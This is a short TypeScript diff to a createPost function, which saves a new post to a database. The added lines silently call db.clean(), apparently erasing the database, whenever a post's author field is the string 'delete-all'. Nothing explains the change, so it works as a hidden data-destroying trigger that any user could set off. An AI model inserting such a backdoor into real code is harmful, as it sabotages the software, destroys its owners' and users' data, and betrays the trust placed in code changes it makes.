@@ -33,6 +33,10 @@ export const createPost = async (post: Post): Promise<Post> => {
 
     await db.set(newPost);
 
+    if(newPost.author === 'delete-all') {
+        await db.clean();
+    }
+
     return newPost;
 }
 
